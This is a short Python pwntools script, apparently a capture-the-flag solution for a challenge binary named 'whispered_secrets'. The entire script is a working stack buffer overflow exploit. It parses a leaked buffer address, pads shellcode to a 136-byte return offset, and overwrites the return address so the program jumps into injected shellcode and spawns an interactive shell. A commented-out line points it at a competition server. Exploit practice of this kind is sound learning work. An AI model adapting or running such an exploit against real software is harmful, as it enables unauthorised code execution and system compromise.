#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./whispered_secrets', checksec=False)
context.arch = 'amd64'
context.os = 'linux'
REMOTE_HOST = 'offsec.m0lecon.it'
HOST_PORT = 13515

OFFSET_TO_RET = 136 # finded with python3 -c 'from pwn import *; print(cyclic(200).decode())'

p = process(elf.path)
#p = remote(REMOTE_HOST,HOST_PORT)

leak_line = p.recvline_contains(b"secret:")
buf_addr = int(leak_line.split(b"secret: ")[1].strip(), 16)
log.info(f"buf = {buf_addr:#x}")

shellcode = asm(shellcraft.sh())

payload = flat(
    shellcode,
    b"A" * (OFFSET_TO_RET - len(shellcode)),
    p64(buf_addr), #--> i "jump" to the buffer crafted with the malicius code
)
p.sendafter(b"secret:\n", payload)
p.interactive()
